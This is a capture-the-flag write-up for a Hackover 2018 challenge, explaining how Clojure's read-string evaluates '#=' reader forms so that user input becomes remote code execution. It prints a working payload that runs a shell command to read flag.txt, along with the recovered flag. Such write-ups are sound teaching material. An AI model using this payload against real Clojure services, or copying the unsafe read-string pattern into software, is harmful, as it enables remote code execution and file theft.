# Pwn (reverse, 477p, 13 solved)

A high level pwnable challenge for which we get [source code](main.clj) in Clojure/LISP.

Interestingly the challenge is very similar to task from Insomnihack few years back, which was written in LISP -> https://github.com/p4-team/ctf/tree/master/2016-03-18-insomnihack-final/misc_robots

The only important part is:

```lisp
  (try
    (-> (read-line)
        (read-string))
    (println "Good job, you know how to balance brackets. Now go, get the flag.")
    (catch Exception e
      (println "You need to work on your balancing skills."))))
```

The point is that input read by `read-string` is actually automatically evaluated as LISP code (a bit like `input()` function did in Python 2)!
This is how the "parenthesis checker" works here - by evaluating the input.
This means we can execute any valid Clojure code, which means we've got RCE here!

We can confirm this by sending `#=(println "test")` which gives us back echo.
Now we can simply invoke shell commands with `#=(clojure.java.shell/sh "cat" "flag.txt")` and if we combine this we get `#=(println #=(clojure.java.shell/sh "cat" "flag.txt"))` and server prints the flag for us: `hackover18{n3v3r_tru5s7_u53r_1npu7}`
